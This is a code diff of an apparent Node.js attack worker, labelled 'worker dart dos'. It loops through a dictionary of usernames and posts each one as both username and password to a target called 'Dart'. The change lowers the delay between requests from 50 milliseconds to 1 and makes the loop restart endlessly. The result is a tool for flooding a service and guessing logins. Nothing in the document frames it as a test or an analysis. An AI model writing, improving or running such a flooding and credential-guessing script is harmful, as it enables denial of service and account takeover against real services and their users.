@@ -13,17 +13,21 @@ var port = process.env.PORT || 5000;
 console.log("starting worker dart dos");
 var i = 0;
 var max = bdict.result.length;
-var delaytime = 50; //mins * secs * millisecs
+var delaytime = 1; //mins * secs * millisecs
 var idinterval = setInterval(function(){
-    var user = bdict.result[i++].username;
-    var pass = bdict.result[i].username;
-    postDosToDart(user,pass);
-    if(i > max)
+    if(i++ > max)
     {
         //clearInterval(idinterval);
         i = 0;
         console.log("resetting the worker.");
     }
+    else
+    {
+        var user = bdict.result[i].username;
+        var pass = bdict.result[i].username;
+        postDosToDart(user,pass);
+    }
+    
 },delaytime);
 
 function postDosToDart(username,password)
